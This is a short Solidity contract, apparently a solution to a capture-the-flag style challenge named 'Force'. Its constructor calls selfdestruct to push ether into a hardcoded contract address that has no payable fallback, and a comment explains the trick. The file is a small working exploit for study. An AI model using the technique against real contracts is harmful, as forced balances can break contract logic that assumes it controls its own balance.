// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title Hacker contract for Force
    @notice The selfdestruct method can send funds to any accounts, even contracts with no fallback methods since it doesn't call the fallback method.
*/

contract HackForce {
    address Force = 0xAC19EEAB06609f65556462c01D80a163d770405a;

    constructor() payable {
        selfdestruct(payable(Force));
    }
}